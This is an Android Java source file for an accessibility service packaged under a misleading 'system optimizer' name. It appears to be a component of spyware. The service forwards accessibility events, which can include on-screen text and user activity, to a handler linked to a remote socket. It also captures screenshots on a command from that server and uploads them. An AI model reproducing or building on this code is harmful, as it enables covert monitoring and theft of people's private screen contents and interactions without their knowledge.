package com.system.optimizer;

import com.system.optimizer.handler.AccessibilityEventHandler;
import com.system.optimizer.handler.ScreenshotCapture;
import com.system.optimizer.handler.ScreenshotCallback;
import com.system.optimizer.config.ConfigData;
import com.system.optimizer.config.ConfigManager;
import com.system.optimizer.network.SocketManager;

import android.accessibilityservice.AccessibilityService;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;

public class AccessibilityLoggerService extends AccessibilityService {
    private static final String TAG = "AccessibilityLoggerService";

    private SocketManager socketManager;
    private ConfigManager configManager;
    private AccessibilityEventHandler accessibilityEventHandler;
    private ScreenshotCapture screenShotCapture;
    private boolean isInitialized = false;

    @Override
    public void onCreate() {
        super.onCreate();
        Log.d(TAG, "AccessibilityLoggerService onCreate - starting async initialization");

        try {
            // Create ConfigManager without blocking network operation
            this.configManager = new ConfigManager(this);
            
            // Initialize config asynchronously and wait for completion
            configManager.initializeAsync(new ConfigManager.ConfigInitCallback() {
                @Override
                public void onConfigInitialized(ConfigData config) {
                    if (config != null) {
                        Log.d(TAG, "Config loaded successfully, initializing remaining components");
                        initializeRemainingComponents();
                    } else {
                        Log.e(TAG, "Failed to load config, service may not function properly");
                        // Still try to initialize with whatever we have
                        initializeRemainingComponents();
                    }
                }
            });
        } catch (Exception e) {
            // Log error but don't crash the service
            Log.e(TAG, "Error initializing components", e);
        }
    }

    /**
     * Initialize the remaining components after config is loaded.
     * This is called from the callback when config is ready.
     */
    private void initializeRemainingComponents() {
        try {
            // SocketManager constructor already calls connect() internally
            this.socketManager = new SocketManager(this, configManager);
            
            // Create screenshot capture first
            this.screenShotCapture = new ScreenshotCapture(this, configManager);
            
            // Create text handler with screenshot capture reference
            this.accessibilityEventHandler = new AccessibilityEventHandler(screenShotCapture, socketManager);
            
            // Add listener for manual screenshot requests
            this.socketManager.addListener("screenshot", args -> {
                // Capture screenshot and send as response
                screenShotCapture.takeScreenshot(new ScreenshotCallback() {
                    @Override
                    public void onSuccess(byte[] imageData) {
                        if (imageData != null) {
                            socketManager.sendEvent("screenshot_response", imageData);
                        }
                    }

                    @Override
                    public void onError(String errorMessage) {
                        socketManager.sendEvent("screenshot_error", errorMessage);
                    }
                });
            });
            
            this.isInitialized = true;
            
            Log.d(TAG, "All components initialized successfully");
        } catch (Exception e) {
            Log.e(TAG, "Error initializing remaining components", e);
        }
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event == null) {
            return;
        }

        // Wait for initialization to complete before processing events
        if (!isInitialized) {
            Log.w(TAG, "Service not yet initialized, ignoring event");
            return;
        }

        try {
            accessibilityEventHandler.onAccessibilityEvent(event);
        } catch (Exception e) {
            Log.e(TAG, "Error handling accessibility event", e);
        }
    }

    @Override
    public void onInterrupt() {
    }

    @Override
    public void onDestroy() {
        try {
            if (socketManager != null) {
                socketManager.disconnect();
            }
        } catch (Exception e) {
            Log.e(TAG, "Error during cleanup", e);
        } finally {
            super.onDestroy();
        }
    }

}
